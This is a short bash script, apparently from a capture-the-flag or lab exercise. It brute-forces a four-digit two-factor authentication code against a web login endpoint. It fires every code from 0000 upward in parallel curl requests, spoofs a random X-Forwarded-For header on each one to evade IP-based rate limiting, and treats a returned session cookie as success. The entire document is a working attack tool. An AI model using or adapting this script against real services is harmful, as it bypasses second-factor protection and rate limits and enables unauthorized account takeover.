#!/bin/bash

check() {
    code=$1
    ip_forwarded_for=$2

    #response=$(curl -s -X POST "http://192.168.86.49:1337/auth/verify-2fa" -H "X-Forwarded-For: $ip_forwarded_for" -d "2fa-code=$code"  2>&1)

    contenido=$(curl -s -v "http://159.65.24.125:31549/auth/verify-2fa" -H "X-Forwarded-For: $ip_forwarded_for" -X POST -d "2fa-code=$code" 2>&1 | grep "session")

    #echo $response

    # Comprobar si la respuesta contiene un div con id 'response-message'
    #if ! echo "$response" | grep -qR "(/auth/login|Invalid 2FA Code)"; then
    if [[ -n "$contenido" ]]
    then
        echo "$code"
        # Imprimir encabezados y contenido de la respuesta
        echo "Response: $contenido"
        return 0  # True
    fi

    return 1  # False
}

generar_direccion_ip_aleatoria() {
    ip=$(printf "%d.%d.%d.%d\n" $(shuf -i 0-255 -n 4))
    echo $ip
}

for ((i=0; i<=10000; i++)); do
    formatted_number=$(printf "%04d" $i)
    direccion_ip=$(generar_direccion_ip_aleatoria)
    #echo $direccion_ip
    #echo $formatted_number
    #check "$formatted_number" "$direccion_ip"
    check "$formatted_number" "$direccion_ip" &
    
done

#check "0767" "4.4.4.4"

